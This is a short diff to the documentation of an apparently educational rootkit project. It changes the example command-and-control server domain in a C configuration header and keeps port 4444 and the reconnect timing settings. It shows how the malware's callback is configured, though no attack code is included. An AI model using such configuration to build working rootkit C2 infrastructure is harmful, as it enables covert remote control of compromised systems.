@@ -25,7 +25,7 @@ When the rootkit loads, it automatically:
 ### Configuration with Domain Support
 ```c
 // rootkit/core/config.h - Domain examples
-#define C2_SERVER_ADDRESS "jules-c2.example.com"  // Domain name
+#define C2_SERVER_ADDRESS "jules_chef_de_majeur.epirootkit.com"  // Domain name
 #define C2_SERVER_PORT 4444
 #define KEEPALIVE_INTERVAL_MS 60000
 #define RECONNECT_DELAY_MS 5000
